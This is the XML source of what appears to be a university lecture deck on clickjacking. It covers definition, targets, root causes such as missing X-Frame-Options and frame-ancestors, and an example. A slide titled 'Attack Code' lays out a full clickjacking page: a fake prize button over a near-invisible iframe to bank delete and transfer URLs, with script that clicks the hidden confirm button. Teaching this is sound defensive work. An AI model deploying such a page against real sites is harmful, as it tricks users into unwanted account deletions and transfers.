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61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6" r:id="rId11"/>
    <p:sldId id="267" r:id="rId12"/>
    <p:sldId id="269" r:id="rId13"/>
    <p:sldId id="268" r:id="rId14"/>
    <p:sldId id="270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904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9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72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2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8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6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8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8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8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795ADD9-718A-4154-B910-4325AEE6D28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0DAF8CF-63E6-49FB-BEF1-9CC8E23FE99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79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.ahmadnawazz@gmail.com" TargetMode="External"/><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:Engr.ahmad.Nawaz@giki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910B-5F6A-47A5-A46C-2FD04C6BC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57625"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="60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E6057-97AD-4469-B152-70541F8D4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841424"/>
            <a:ext cx="10058400" cy="2011720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US" sz="5100" b="1" dirty="0"/>
              <a:t>Engr. M Ahmad Nawaz</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="5100" b="1" dirty="0"/>
              <a:t>Cyber Security Lecturer</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="5100" b="1" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="5100" b="1" dirty="0"/>
              <a:t>FCSE Department, GIK Topi, Swabi, KPK, Pakistan</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" sz="5100" b="1" dirty="0">
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>Engr.ahmad.Nawaz@giki.edu.pk</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="5100" b="1" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="5100" b="1" dirty="0">
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>m.ahmadnawazz@gmail.com</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="51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0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769855" y="290376"/>
            <a:ext cx="1065228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Definition</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="just"/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Clickjacking (User Interface redress attack) is a malicious technique where an attacker tricks a user into clicking on something different from what the user perceives, potentially revealing confidential information or taking control of their computer while clicking on seemingly innocuous web pages.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" sz="2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Usage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Unauthorized social media actions (liking, sharing, following)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Financial transactions without consent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Installing malware or browser extensions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Granting camera/microphone permissions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Account deletion or modification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Password changes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/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2042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622170" y="252669"/>
            <a:ext cx="10774836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Targeting System Area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Social media platforms (like/follow buttons)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Banking interfaces (transfer buttons)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Admin panels (delete/modify actions)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OAuth consent screens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E-commerce checkout buttons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Security settings pages</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" sz="2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Vulnerability Root Cause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Missing X-Frame-Options header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Missing Content-Security-Policy frame-ancestors directive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No frame-busting JavaScript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Sensitive actions without explicit confirmation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Overly permissive CORS policies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Transparent iframe overlays</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="115260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848413" y="592034"/>
            <a:ext cx="1004897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  <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" sz="2400" b="1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🌍 Real-World Example</a:t>
            </a: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Scenario: Twitter Follow Attack (2022)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 security researcher discovered that popular websites were vulnerable to clickjacking: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Attacker creates a page with invisible Twitter "Follow" button overlay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User thinks they're clicking a "Play Video" button</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod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Actually follows attacker's account</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr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Impact</a:t>
            </a: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: 50,000+ users unknowingly followed attacker accounts</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="40071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829559" y="271523"/>
            <a:ext cx="10048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ECF88-ED47-4E49-92B3-16A0B5EF9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676" y="794743"/>
            <a:ext cx="7466711" cy="55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1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829559" y="271523"/>
            <a:ext cx="10048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B90EC-0A0D-4FAA-ADA5-F50CC11CB16F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1131216" y="2029914"/>
            <a:ext cx="9851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Attacker's gaming site → Invisible iframe with bank.com/delete-account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clicks "Claim Prize" → Actually clicks "Confirm Delete"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 deleted without user knowledge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D4956F-6B19-4281-9D93-CB956A6B5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241" y="12820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Scenario: Bank Account Deletion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-apple-system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81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26679-8CF1-427A-B853-D8A03EEF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1" y="0"/>
            <a:ext cx="121587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4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443060" y="-19972"/>
            <a:ext cx="10048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D6F65-F451-4DBA-8784-FD46B88B16E4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="612742" y="52063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Attack Code</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" b="1" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1D1D1F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="system-ui"/>
              </a:rPr>
              <a:t>Attacker's Malicious Page</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="0" i="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="1D1D1F"/>
                </a:solidFill>
                <a:effectLst/>
                <a:latin typeface="system-ui"/>
              </a:rPr>
              <a:t>: Save as with html extension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86FF5-E0D4-42DC-A742-4A7979002E0F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="518473" y="1184351"/>
            <a:ext cx="5156462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&lt;!DOCTYPE html&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>&lt;html lang="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>en</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>&lt;head&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>    &lt;meta charset="UTF-8"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>    &lt;title&gt;🎮 Free Gaming Credits - Claim Now!&lt;/title&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>    &lt;style&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>        * { margin: 0; padding: 0; box-sizing: border-box; }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>        body {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            min-height: 100vh;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            display: flex;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            justify-content: center;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            align-items: center;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            overflow: hidden;         }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>        .clickbait-container {             position: relative;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            width: 100%;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            height: 100vh;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            display: flex;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            justify-content: center;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            align-items: center;         }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>        .prize-button {             position: relative;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            z-index: 1;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            padding: 50px 100px;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            font-size: 32px;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            font-weight: bold;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            background: linear-gradient(45deg, #ffd700, #ffed4e);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            border: 5px solid #ff6b6b;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            border-radius: 20px;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            cursor: pointer;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            box-shadow: 0 15px 40px </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>rgba</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>(0,0,0,0.4);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            animation: pulse 1s infinite, float 3s ease-in-out infinite;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            color: #d32f2f;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            text-shadow: 2px </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>2px</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t> 4px </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>rgba</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>(0,0,0,0.2);         }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>                </a:t>
            </a:r>
          </a:p>
          <a:p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9245E-2CF8-4BD2-9628-0B1FEB6811CA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4473017" y="1473079"/>
            <a:ext cx="51564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        </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="800" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        @keyframes pulse {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            0%, 100% { transform: scale(1); }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            50% { transform: scale(1.08); }        }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>.hidden-frame {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            position: absolute;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            top: 50%;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            left: 50%;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            transform: translate(-50%, -50%);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            width: 400px;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            height: 300px;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            opacity: 0.01;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            z-index: 2;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            pointer-events: auto;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            border: none;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&lt;/style&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>&lt;/head&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>&lt;body&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>    &lt;div class="clickbait-container"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        &lt;button class="prize-button" onclick="</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>showFakeProcessing</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>()"&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            🎉 CLICK TO WIN $1000! 🎉</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        &lt;/button&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        &lt;iframe </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            id="victim-frame"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            class="hidden-frame"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src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>="https://bank.com/account/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0" err="1"/>
              <a:t>delete?confirm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>=true"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>            sandbox="allow-same-origin allow-scripts allow-forms allow-popups"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>        &gt;&lt;/iframe&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>    &lt;/div&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="800" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US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B6040-F4EA-45A6-9238-2E556CF59511}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7847813" y="503248"/>
            <a:ext cx="515646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    </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>    &lt;script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>        let </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>mouseX</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t> = 0, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>mouseY</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t> = 0;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>        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document.addEventListener</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>mousemove</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>', (e) =&gt; {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mouseX</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>e.clientX</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>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mouseY</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>e.clientY</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>        });</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>        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document.addEventListener</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>('click', function(e) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            const overlay = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>document.createElement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>('div');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overlay.style.position</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t> = 'fixed';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overlay.style.left</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t> = (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>mouseX</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t> - 100) + 'px';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overlay.style.top</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t> = (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>mouseY</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t> - 25) + 'px';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overlay.style.width</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t> = '200px';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overlay.style.height</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t> = '50px';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overlay.style.zIndex</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t> = '9999';</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            const iframe = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>document.createElement</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>('iframe');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iframe.src</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t> = 'https://bank.com/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>transfer?to</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>attacker&amp;amount</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>=1000&amp;confirm=true';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iframe.style.width</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t> = '100%';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iframe.style.height</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t> = '100%';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iframe.style.opacity</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t> = '0.01';</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            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overlay.appendChild</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>(iframe);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document.body.appendChild</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>(overlay);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            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setTimeout</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>(() =&gt; {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>                try {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>                    const </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>btn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t> = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>iframe.contentDocument.querySelector</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>('</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>button.confirm</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>');</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>                    if (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>btn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>) </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>btn.click</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>();</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>                } catch (err) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>                    console.log('[+] Click registered');</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>                }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>                </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>setTimeout</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>(() =&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0" err="1"/>
              <a:t>document.body.removeChild</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>(overlay), 1000);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>            }, 100);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>        });</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>    &lt;/script&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1000" dirty="0"/>
              <a:t>&lt;/body&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1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48210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8D048C-48C2-478C-88DF-11C641B435BB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
